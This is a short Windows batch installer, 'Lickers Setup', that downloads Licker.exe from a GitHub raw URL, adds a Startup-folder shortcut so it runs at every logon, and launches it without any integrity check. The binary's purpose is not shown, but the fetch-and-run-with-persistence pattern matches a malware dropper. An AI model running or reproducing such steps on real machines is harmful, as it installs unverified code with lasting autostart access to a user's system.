@echo off
title Lickers Setup
:: MAKE SURE THIS URL IS EXACTLY CORRECT
set "EXE_URL=https://raw.githubusercontent.com/sankarideb1-hue/Lickers/main/Licker.exe"
set "SAVE_PATH=%USERPROFILE%\Licker.exe"
set "STARTUP_LINK=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Licker.lnk"

echo ------------------------------------------
echo   INSTALLING LICKERS...
echo ------------------------------------------

:: The "-f" flag helps identify if the URL is actually broken
curl -f -L "%EXE_URL%" -o "%SAVE_PATH%"

if exist "%SAVE_PATH%" (
    echo [OK] File downloaded successfully.
    powershell -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('%STARTUP_LINK%'); $s.TargetPath = '%SAVE_PATH%'; $s.Save()"
    echo [OK] Added to Windows Startup.
    echo ------------------------------------------
    echo DONE! Running Licker now...
    start "" "%SAVE_PATH%"
) else (
    echo [ERROR] Download failed. 
    echo Please check if https://github.com/sankarideb1-hue/Lickers/blob/main/Licker.exe exists.
)
pause
